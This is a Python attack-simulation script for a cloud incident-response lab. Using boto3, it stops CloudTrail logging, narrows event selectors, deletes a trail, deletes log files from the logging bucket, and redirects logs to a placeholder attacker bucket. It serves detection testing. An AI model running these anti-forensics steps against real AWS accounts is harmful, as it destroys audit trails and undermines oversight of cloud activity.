"""
CloudTrail Tampering / Anti-Forensics Attack Simulation
========================================================

MITRE ATT&CK Mapping:
    T1562.008 - Impair Defenses: Disable Cloud Logs (StopLogging, DeleteTrail)
    T1070      - Indicator Removal (S3 log deletion, event selector narrowing)

Techniques:
    1. StopLogging - disable CloudTrail logging
    2. PutEventSelectors - narrow selectors to exclude specific API calls
    3. DeleteTrail - delete the trail entirely
    4. S3 log deletion - delete CloudTrail log files from the logging bucket
    5. UpdateTrail - redirect logs to attacker-controlled bucket

WARNING: For lab use only. All operations target lab-provisioned resources.
"""

import boto3
import argparse
import time
from botocore.exceptions import ClientError


BANNER = """
========================================================
  CloudTrail Tampering / Anti-Forensics - Attack Simulation
========================================================
  MITRE ATT&CK: T1562.008, T1070
  Techniques:   StopLogging, PutEventSelectors,
                DeleteTrail, S3 log deletion, UpdateTrail
========================================================
"""


def timestamp():
    return time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime())


def stop_logging(ct, trail_name, sleep_time):
    """T1562.008 - Attempt to disable CloudTrail logging."""
    print(f"\n[{timestamp()}] [T1562.008] StopLogging")
    print(f"    [*] Attempting to stop logging on trail: {trail_name}")
    try:
        ct.stop_logging(Name=trail_name)
        print(f"    [!] SUCCESS - Logging stopped on {trail_name}")

        # Immediately re-enable (lab safety)
        print(f"    [*] Re-enabling logging for lab safety...")
        ct.start_logging(Name=trail_name)
        print(f"    [+] Logging re-enabled on {trail_name}")
    except ClientError as e:
        code = e.response['Error']['Code']
        if code == 'AccessDeniedException':
            print(f"    [+] AccessDenied (Expected)")
        elif code == 'TrailNotFoundException':
            print(f"    [-] Trail not found: {trail_name}")
        else:
            print(f"    [-] Failed: {code} - {e.response['Error']['Message']}")
    time.sleep(sleep_time)


def narrow_event_selectors(ct, trail_name, sleep_time):
    """T1070 - Narrow event selectors to exclude management events."""
    print(f"\n[{timestamp()}] [T1070] PutEventSelectors")
    print(f"    [*] Attempting to narrow event selectors on trail: {trail_name}")

    # First, read current selectors
    try:
        current = ct.get_event_selectors(TrailName=trail_name)
        print(f"    [*] Current selectors: {len(current.get('EventSelectors', []))} selector(s)")

        # Attempt to set restrictive selectors that would miss most events
        ct.put_event_selectors(
            TrailName=trail_name,
            EventSelectors=[
                {
                    'ReadWriteType': 'WriteOnly',
                    'IncludeManagementEvents': False,
                    'DataResources': []
                }
            ]
        )
        print(f"    [!] SUCCESS - Event selectors narrowed (management events excluded)")

        # Restore original selectors (lab safety)
        print(f"    [*] Restoring original selectors for lab safety...")
        if current.get('EventSelectors'):
            ct.put_event_selectors(
                TrailName=trail_name,
                EventSelectors=current['EventSelectors']
            )
            print(f"    [+] Original selectors restored")
    except ClientError as e:
        code = e.response['Error']['Code']
        if code == 'AccessDeniedException':
            print(f"    [+] AccessDenied (Expected)")
        elif code == 'TrailNotFoundException':
            print(f"    [-] Trail not found: {trail_name}")
        else:
            print(f"    [-] Failed: {code} - {e.response['Error']['Message']}")
    time.sleep(sleep_time)


def delete_trail(ct, trail_name, sleep_time):
    """T1562.008 - Attempt to delete the CloudTrail trail entirely."""
    print(f"\n[{timestamp()}] [T1562.008] DeleteTrail")
    print(f"    [*] Attempting to delete trail: {trail_name}")
    try:
        ct.delete_trail(Name=trail_name)
        print(f"    [!] SUCCESS - Trail deleted: {trail_name}")
        print(f"    [!] WARNING: Trail has been deleted. Manual re-creation required.")
    except ClientError as e:
        code = e.response['Error']['Code']
        if code == 'AccessDeniedException':
            print(f"    [+] AccessDenied (Expected)")
        elif code == 'TrailNotFoundException':
            print(f"    [-] Trail not found: {trail_name}")
        else:
            print(f"    [-] Failed: {code} - {e.response['Error']['Message']}")
    time.sleep(sleep_time)


def delete_s3_logs(s3, ct, trail_name, sleep_time):
    """T1070 - Attempt to delete CloudTrail log files from the logging bucket."""
    print(f"\n[{timestamp()}] [T1070] S3 Log Deletion")

    # First, discover the logging bucket from the trail configuration
    logging_bucket = None
    log_prefix = None
    try:
        trail_info = ct.describe_trails(trailNameList=[trail_name])
        trails = trail_info.get('trailList', [])
        if trails:
            logging_bucket = trails[0].get('S3BucketName')
            log_prefix = trails[0].get('S3KeyPrefix', '')
            print(f"    [*] Logging bucket: {logging_bucket}")
            print(f"    [*] Log prefix: {log_prefix or '(none)'}")
        else:
            print(f"    [-] Trail not found: {trail_name}")
            return
    except ClientError as e:
        code = e.response['Error']['Code']
        if code == 'AccessDeniedException':
            print(f"    [+] AccessDenied describing trail (Expected)")
            return
        else:
            print(f"    [-] Failed to describe trail: {code}")
            return

    if not logging_bucket:
        print(f"    [-] No logging bucket configured for trail")
        return

    # Attempt to list and delete log objects
    print(f"    [*] Attempting to list and delete log objects...")
    try:
        prefix = log_prefix + '/' if log_prefix else ''
        prefix += 'AWSLogs/'
        paginator = s3.get_paginator('list_objects_v2')
        deleted = 0

        for page in paginator.paginate(Bucket=logging_bucket, Prefix=prefix, MaxKeys=10):
            for obj in page.get('Contents', []):
                key = obj['Key']
                print(f"    [*] Attempting to delete: {key}")
                try:
                    s3.delete_object(Bucket=logging_bucket, Key=key)
                    print(f"    [!] Deleted: {key}")
                    deleted += 1
                except ClientError as e:
                    code = e.response['Error']['Code']
                    if code == 'AccessDenied':
                        print(f"    [+] AccessDenied deleting {key} (Expected)")
                    else:
                        print(f"    [-] Failed to delete {key}: {code}")
                time.sleep(sleep_time)
            # Only attempt first page of results for safety
            break

        print(f"    [*] Deleted {deleted} log object(s)")

    except ClientError as e:
        code = e.response['Error']['Code']
        if code == 'AccessDenied':
            print(f"    [+] AccessDenied listing log objects (Expected)")
        else:
            print(f"    [-] Failed: {code}")


def update_trail_destination(ct, trail_name, sleep_time):
    """T1070 - Attempt to redirect CloudTrail logs to a different bucket."""
    print(f"\n[{timestamp()}] [T1070] UpdateTrail - Redirect Destination")
    print(f"    [*] Attempting to redirect trail logs to attacker-controlled bucket")
    try:
        ct.update_trail(
            Name=trail_name,
            S3BucketName='attacker-controlled-bucket-simulation'
        )
        print(f"    [!] SUCCESS - Trail redirected to attacker bucket")
    except ClientError as e:
        code = e.response['Error']['Code']
        if code == 'AccessDeniedException':
            print(f"    [+] AccessDenied (Expected)")
        elif code == 'TrailNotFoundException':
            print(f"    [-] Trail not found: {trail_name}")
        elif code == 'InsufficientS3BucketPolicyException':
            print(f"    [+] InsufficientS3BucketPolicy (bucket does not exist or lacks policy)")
        else:
            print(f"    [-] Failed: {code} - {e.response['Error']['Message']}")
    time.sleep(sleep_time)


def simulate(profile, region, trail_name, sleep_time):
    print(BANNER)
    print(f"[{timestamp()}] Starting CloudTrail Tampering simulation")
    print(f"[{timestamp()}] Profile: {profile} | Region: {region} | Trail: {trail_name}")

    session = boto3.Session(profile_name=profile, region_name=region)
    sts = session.client('sts')
    ct = session.client('cloudtrail')
    s3 = session.client('s3')

    try:
        identity = sts.get_caller_identity()
        print(f"[{timestamp()}] Identity: {identity['Arn']}")
    except Exception as e:
        print(f"[{timestamp()}] [!] Failed to get identity: {e}")
        return

    # Technique 1: StopLogging
    stop_logging(ct, trail_name, sleep_time)

    # Technique 2: PutEventSelectors
    narrow_event_selectors(ct, trail_name, sleep_time)

    # Technique 3: DeleteTrail
    delete_trail(ct, trail_name, sleep_time)

    # Technique 4: S3 log deletion
    delete_s3_logs(s3, ct, trail_name, sleep_time)

    # Technique 5: UpdateTrail destination
    update_trail_destination(ct, trail_name, sleep_time)

    print(f"\n[{timestamp()}] CloudTrail Tampering simulation complete")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='CloudTrail Tampering / Anti-Forensics attack simulation for Cloud IR Lab'
    )
    parser.add_argument('--profile', required=True, help='AWS CLI profile name')
    parser.add_argument('--region', default='us-east-1', help='AWS region')
    parser.add_argument('--trail-name', required=True,
                        help='Name of the CloudTrail trail to target')
    parser.add_argument('--sleep', type=float, default=1.0,
                        help='Sleep between actions (seconds)')

    args = parser.parse_args()
    simulate(args.profile, args.region, args.trail_name, args.sleep)
